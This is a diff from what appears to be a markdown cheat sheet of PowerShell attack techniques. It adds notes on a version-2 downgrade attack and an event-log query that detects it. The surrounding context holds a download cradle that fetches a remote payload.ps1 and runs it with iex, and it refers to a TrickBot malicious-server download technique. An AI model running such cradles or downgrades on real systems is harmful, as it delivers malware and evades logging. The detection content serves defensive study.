@@ -18,6 +18,24 @@
 
 ```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"```
 
+PowerShell Downgrade Attack
+
+```
+PowerShell –Version 2 –Command <…>
+```
+
+Detecting PowerShell Downgrade Attacks
+
+```
+Get-WinEvent -LogName "Windows PowerShell" |
+    Where-Object Id -eq 400 |
+    Foreach-Object {
+        $version = [Version] (
+            $_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1')
+        if($version -lt ([Version] "5.0")) { $_ }
+}
+```
+
 ## TrickBot PowerShell Download TTP:
 
 1. Insert base64 string for malicious web server
